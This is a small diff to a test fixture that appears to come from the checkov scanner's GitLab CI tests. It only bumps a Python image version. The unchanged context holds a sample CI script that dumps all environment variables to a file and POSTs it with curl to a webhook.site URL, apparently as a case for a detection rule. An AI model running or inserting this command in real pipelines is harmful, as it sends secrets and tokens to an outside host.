@@ -48,7 +48,7 @@ def definitions() -> dict[str, Any]:
         "__endline__": 32
       },
       "/checkov/tests/gitlab_ci/resources/curl/.gitlab-ci.yml": {
-        "image": "python:3.9-buster",
+        "image": "python:3.10-buster",
         "test": {
           "script": [
             "echo \"get the envs\"\napt update\napt -y install curl\npython -c \u0027import json, os;print(json.dumps(dict(os.environ)))\u0027 \u003e env.json\ncurl -H \\\"Content-Type: application/json\\\" -X POST --data \"@env.json\" https://webhook.site/4cf17d70-56ee-4b84-9823-e86461d2f826\n"
